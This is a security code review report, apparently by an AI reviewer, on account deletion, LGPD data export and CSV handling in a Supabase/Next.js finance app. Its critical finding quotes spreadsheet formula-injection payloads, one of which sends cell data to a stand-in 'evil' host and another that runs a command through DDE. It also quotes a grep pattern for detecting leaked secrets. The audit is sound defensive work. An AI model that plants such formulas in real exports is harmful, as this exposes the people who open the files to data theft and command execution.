---
phase: 06-endurecimento-lgpd-isolamento-auditoria
reviewed: 2026-06-17T00:00:00Z
depth: deep
reviewer: gsd-code-reviewer
files_reviewed: 21
files_reviewed_list:
  - src/lib/supabase/admin.ts
  - src/actions/delete-account.ts
  - src/actions/export-data.ts
  - src/lib/export/bundle.ts
  - src/lib/transactions/csv.ts
  - src/lib/data/owned-tables.ts
  - src/app/(app)/conta/page.tsx
  - src/app/(app)/extrato/page.tsx
  - src/components/delete-account-form.tsx
  - src/components/export-data-button.tsx
  - src/components/export-transactions-button.tsx
  - src/components/user-menu.tsx
  - src/components/app-sidebar.tsx
  - src/actions/delete-account.test.ts
  - src/lib/transactions/csv.test.ts
  - tests/isolation-matrix.test.ts
  - tests/storage-isolation.test.ts
  - tests/bundle-secret-grep.test.ts
  - tests/pii-guard.test.ts
  - tests/lgpd-export.test.ts
  - tests/lgpd-delete.test.ts
  - tests/lgpd-delete-isolation.test.ts
findings:
  critical: 1
  high: 1
  medium: 2
  low: 2
  total: 6
status: findings
---

# Phase 6: Code Review Report — Endurecimento (LGPD, Isolamento, Auditoria)

**Reviewed:** 2026-06-17
**Depth:** deep (cross-file: service-role import graph, delete ordering, RLS export, CSV escaping)
**Files Reviewed:** 21
**Status:** findings

## Summary

This is the most security-sensitive phase in the project: account deletion through the
service-role key and full-data LGPD export. I reviewed the entire delete/service-role/
IDOR/isolation/export/CSV surface adversarially.

**The service-role surface is solid.** `src/lib/supabase/admin.ts` correctly carries
`import 'server-only'` (line 1), reads only `SUPABASE_SECRET_KEY` and never a
`NEXT_PUBLIC_*` (line 28), throws loudly on a missing secret, and is imported by exactly
one module — `src/actions/delete-account.ts` (verified by grep; no client component
imports it, directly or transitively). `deleteMyAccount` derives `userId` from the
session via `getClaims` and never from input, so the IDOR-on-delete path is closed
(the unit test even passes a forged `userId` and proves it is ignored). The confirm
gate is `z.literal('APAGAR')`. Storage `remove` runs before `auth.admin.deleteUser`, and
a Storage failure aborts before the irreversible auth delete with an `account intact +
retryable` posture. The export path reads via the RLS-scoped server client (never
admin.ts), so "only my rows" is structural, and the bundle is data-driven over the
central 14-table `OWNED_TABLES` — completeness can't silently drift from the schema. The
isolation matrix is genuinely data-driven (4 verbs × 14 tables iterated over
`OWNED_TABLES`/`ISOLATION_INSERT_SHAPES`), and no test was loosened to pass.

**Two real defects remain.** (1) **CRITICAL** — the transactions CSV serializer does not
defend against spreadsheet *formula injection*: a `description` (or resolved
`category_name`) beginning with `=`, `+`, `-`, `@`, TAB, or CR is written verbatim and
will execute as a formula when the exported `.csv` is opened in Excel / Google Sheets /
LibreOffice. `description` is fully user-controlled, and this CSV is both downloaded
standalone and embedded in the LGPD bundle. (2) **HIGH** — `deleteMyAccount` lists
Storage objects with `{ limit: 1000 }` and removes only that single page; a user with
>1000 statement objects has the surplus orphaned, yet the irreversible
`auth.admin.deleteUser` still proceeds — defeating the exact "no orphan" guarantee the
Storage-first ordering exists to provide. The remaining findings are lower-severity
robustness/quality items.

---

## Critical Issues

### CR-01: Transactions CSV is vulnerable to spreadsheet formula injection

**File:** `src/lib/transactions/csv.ts:36-38` (the `field()` escaper); consumed at
`src/lib/transactions/csv.ts:62-76`, embedded in the LGPD bundle at
`src/lib/export/bundle.ts:58-72,181`.

**Issue:** `field()` only RFC-4180-quotes a value when it matches `/[;"\r\n]/`. It does
**nothing** for the CSV-injection prefixes `=`, `+`, `-`, `@`, TAB (`\t`), or CR. The
`description` field comes straight from user input (and `category_name` from a
user-named category), so a transaction described as `=HYPERLINK("http://evil/"&A1)`,
`=cmd|'/c calc'!A1`, or `@SUM(...)` is written to the cell unescaped. When the victim (or
an accountant / the user themselves) opens `transacoes-{mes}.csv` or the LGPD
`meus-dados.json`-embedded CSV in Excel/Sheets/LibreOffice, the formula executes —
classic CSV/formula injection (data exfiltration via `=HYPERLINK`/`WEBSERVICE`, or local
command execution via the DDE `=cmd|...` vector on Excel). This is a financial export
opened in spreadsheets by design, so the threat is concrete, not theoretical. The
existing `csv.test.ts` only tests `;"\n` escaping (line 78-94) — the formula-injection
case is neither handled nor tested. Note `R$ ...` values from `formatCents` are safe
(they start with `R`), and the MEI CSV (`src/lib/mei/csv.ts`) emits only numeric/year/
boolean fields, so the exposure is specifically the transactions CSV's free-text columns
(`description`, `category_name`).

**Fix:** Neutralize a leading formula trigger by prefixing the field with a single quote
(`'`) — the standard OWASP CSV-injection defense — *before* RFC-4180 quoting. Apply it to
every free-text field (it is harmless for benign values once quoted):

```ts
// src/lib/transactions/csv.ts
const FORMULA_TRIGGERS = /^[=+\-@\t\r]/

function field(value: string): string {
  // Defuse spreadsheet formula injection (=,+,-,@,TAB,CR) BEFORE RFC-4180 quoting.
  const safe = FORMULA_TRIGGERS.test(value) ? `'${value}` : value
  return /[;"\r\n]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe
}
```

Add a regression test asserting `transactionsToCsv` with `description: '=1+1'` (and
`@`, `+`, `-`, leading TAB) emits a leading `'` so the cell is inert. Consider applying
the same guard to `src/lib/mei/csv.ts` for defense-in-depth even though its current
columns are numeric.

---

## High

### HI-01: deleteMyAccount removes only the first 1000 Storage objects, then irreversibly deletes auth — orphaning the surplus

**File:** `src/actions/delete-account.ts:66-78`

**Issue:** Storage objects are listed once with `{ limit: 1000 }` (line 68) and only that
page is removed (lines 70-74). There is no pagination loop. If a user has accumulated
more than 1000 statement objects under `{userId}/`, the objects beyond the first page are
never enumerated and never removed — yet `auth.admin.deleteUser(userId)` (line 77) still
runs and succeeds. Because Storage is **not** FK-cascaded (the file's own header doc-block
on lines 23-29 states this is exactly why Storage must be cleared first), the surplus
objects become permanent orphans in a private bucket whose owning auth user no longer
exists: undeletable through the normal RLS path and an LGPD-erasure gap (the user's data
was not fully erased). This directly defeats the "no orphan" invariant the Storage-first
ordering was designed to guarantee. The doc-block acknowledges the flat-layout assumption
(A3) but not the >1000 page cap, and no test exercises the multi-page case.

**Fix:** Loop until a `list` page returns fewer than the page size, removing each page,
and only proceed to `deleteUser` once the bucket prefix is fully drained:

```ts
// 3. Storage FIRST — drain ALL pages under {userId}/ before the irreversible delete.
const PAGE = 1000
let offset = 0
for (;;) {
  const { data: files, error: listErr } = await admin.storage
    .from(STATEMENTS_BUCKET)
    .list(userId, { limit: PAGE, offset })
  if (listErr) return { ok: false, error: 'falha_storage' } // intact + retryable
  if (!files?.length) break
  const paths = files.map((f) => `${userId}/${f.name}`)
  const { error: rmErr } = await admin.storage.from(STATEMENTS_BUCKET).remove(paths)
  if (rmErr) return { ok: false, error: 'falha_storage' } // intact + retryable
  if (files.length < PAGE) break
  offset += files.length // or re-list from 0 since removed objects shrink the set
}
```

(Re-listing from offset 0 after each removal is also valid since removed objects leave the
set — pick one and add a >1000-object regression test.)

---

## Medium

### MD-01: `getClaims` JWT validity is the IDOR boundary but its verification mode is not pinned

**File:** `src/actions/delete-account.ts:58-61`; `src/actions/export-data.ts:20-25`

**Issue:** Both the delete and the export derive `userId` solely from
`supabase.auth.getClaims()` `.claims.sub`. This is the correct *source* (session, not
input) and closes the IDOR-from-input vector. However, `getClaims()` in `@supabase/ssr` /
`supabase-js` only cryptographically verifies the JWT when asymmetric (ES/RS) signing
keys are configured for the project; with a legacy symmetric (HS256) secret it can fall
back to decoding without a server round-trip, trusting the cookie's token. For the
*single most dangerous operation in the app*, the session must be authenticated against
the auth server. The code does not assert which mode is in effect, and there is no test
proving a forged/expired cookie token is rejected before `auth.admin.deleteUser`.

**Fix:** Either confirm the project uses asymmetric JWT signing keys (so `getClaims`
verifies signatures) and document that invariant next to the call, or harden the
dangerous path with an authenticated round-trip:

```ts
const { data: { user }, error } = await supabase.auth.getUser() // hits auth server
if (error || !user) return { ok: false, error: 'nao_autenticado' }
const userId = user.id
```

Add an integration test that a request bearing a tampered/expired access-token cookie
yields `nao_autenticado` and performs no delete.

### MD-02: Export bundle aborts wholesale if any single table read errors — no partial-export resilience and a generic failure to the user

**File:** `src/lib/export/bundle.ts:166-174`; surfaced at `src/actions/export-data.ts:27-33`

**Issue:** `buildExportBundle` throws on the first table whose `select('*')` returns an
error (line 170-172). `exportMyData` catches it and returns the generic
`falha_export`. For an LGPD "download all my data" obligation, one transient/permission
hiccup on a single table denies the user their *entire* export with no diagnostic and no
partial result. Because the per-table error message is swallowed server-side, an operator
cannot tell which table failed either. This is a correctness/availability concern for a
compliance feature, not just style.

**Fix:** At minimum, log the per-table error server-side (it is already in
`error.message`) before throwing so failures are diagnosable. Preferably, collect per-table
errors into the bundle (e.g. an `errors: Partial<Record<OwnedTable, string>>` field) and
still return the successfully-read tables, so a single-table failure does not deny the
whole export. Keep the generic client message but stop discarding the cause.

---

## Low

### LO-01: `buildMeiCsv` treats every non-`comercio_industria` invoice as `servicos`

**File:** `src/lib/export/bundle.ts:102-103`

**Issue:** The split uses `if (inv.activity_type === 'comercio_industria') agg.comercio +=
…; else agg.servicos += …`. Any row whose `activity_type` is null, malformed, or a future
third category is silently bucketed into `servicos`, overstating the serviços column in
the consolidated MEI CSV. For the seeded happy path this is correct, but it is a
silent misclassification rather than an explicit handling of the only two known values.

**Fix:** Make the two known values explicit and route anything else to neither (or to an
explicit `outros`/skip with a count), e.g.
`if (inv.activity_type === 'comercio_industria') …; else if (inv.activity_type === 'servicos') …; else continue`.

### LO-02: `delete-account.test.ts` mock omits `auth.getUser`, hiding the MD-01 verification gap

**File:** `src/actions/delete-account.test.ts:41-49`

**Issue:** The `@/lib/supabase/server` mock implements only `auth.getClaims` and returns a
hand-built `{ claims: { sub } }`. This is fine for the input-IDOR contract, but it bakes
in the assumption that an unverified claim is authoritative, so the suite cannot ever
catch a regression where a forged/expired token should be rejected (see MD-01). The mock
gives false confidence that the session boundary is fully tested.

**Fix:** If MD-01 is resolved by switching to `getUser()`, update this mock to drive
`auth.getUser` and add a case where `getUser` returns `{ user: null, error }` → expect
`nao_autenticado` and zero admin calls.

---

## Verified Clean (adversarial checks that passed)

- **Service-role import isolation:** `grep -rln 'supabase/admin|createAdminClient' src/`
  returns only `delete-account.ts` (+ its test + the module itself). No client (`'use
  client'`) component imports it. `import 'server-only'` is present on line 1 of admin.ts.
- **Secret hygiene:** admin.ts reads `SUPABASE_SECRET_KEY` only (line 28), never a
  `NEXT_PUBLIC_*`; throws on missing URL/secret. `check-bundle-secrets.sh` greps
  `sb_secret_|service_role|SUPABASE_SECRET_KEY` against `.next/static`, and the build is
  the authoritative gate.
- **IDOR-on-delete (from input):** `userId` is from `getClaims().sub`; the input type is
  `{ confirm: string }` only. Unit test passes a forged `userId` and proves it is ignored.
- **Delete ordering / no-orphan-on-Storage-failure:** Storage `list`+`remove` precede
  `auth.admin.deleteUser`; a `listErr`/`rmErr` returns `falha_storage` *before* the
  irreversible delete (account intact + retryable). (The >1000-page gap is HI-01.)
- **Export uses RLS client, not service-role:** `exportMyData`/`buildExportBundle` take the
  cookie-scoped server client; admin.ts is never imported here. Bare `select('*')` with no
  manual `.eq('user_id')` — RLS is the boundary. `lgpd-export.test.ts` proves no B row
  leaks into A's bundle (marker + per-row owner assertion).
- **Isolation matrix integrity:** 4 verbs × 14 tables iterated over `OWNED_TABLES` +
  `ISOLATION_INSERT_SHAPES` (single source); `expect(OWNED_TABLES).toHaveLength(14)` and
  no-dupes guard prevent a silently-shrunk subset. INSERT shapes populate NOT-NULL columns
  so WITH CHECK is genuinely exercised. No assertion was weakened.
- **CSV RFC-4180 layout safety:** `;"\r\n` escaping with doubled inner quotes is correct
  (the orthogonal formula-injection gap is CR-01).

---

_Reviewed: 2026-06-17_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: deep_
